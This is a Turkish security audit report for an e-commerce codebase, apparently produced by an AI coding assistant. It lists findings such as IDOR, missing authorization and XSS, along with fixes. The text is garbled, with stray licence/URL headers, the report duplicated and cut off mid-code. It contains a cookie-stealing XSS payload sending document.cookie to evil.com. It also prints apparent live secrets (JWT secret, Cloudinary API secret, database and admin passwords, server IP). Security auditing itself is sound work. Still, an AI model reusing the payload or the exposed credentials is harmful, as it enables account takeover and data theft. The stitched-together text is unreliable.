**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/Aviortheking/games/blob/392a5f75cb70d467a0e001317f6ed236c48123bc/dzeio.next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: Apache-2.0
https://github.com/bettercollected/bettercollected/blob/488dc508c1e666fc17a9d35acf67feea15e8fb0b/webapp/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
